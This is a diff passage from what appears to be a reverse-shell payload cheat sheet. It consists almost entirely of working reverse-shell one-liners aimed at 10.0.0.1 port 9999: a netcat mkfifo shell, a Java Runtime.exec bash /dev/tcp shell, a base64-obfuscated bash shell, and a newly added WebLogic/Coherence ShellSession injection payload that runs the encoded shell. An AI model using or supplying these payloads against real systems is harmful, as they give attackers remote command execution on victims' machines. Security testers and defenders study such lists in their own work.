@@ -80,13 +80,18 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 9999 >/tmp/f
 # Java
 ```
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.1/9999 0>&1"] as String[])
 p.waitFor()
 ```
 ###
 ###
 ```
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
+```
+###
+###
+```
+com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(new%20String%20[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"});')
 ```
 ###
 #### Base64 Encoded Payload for Deserialization
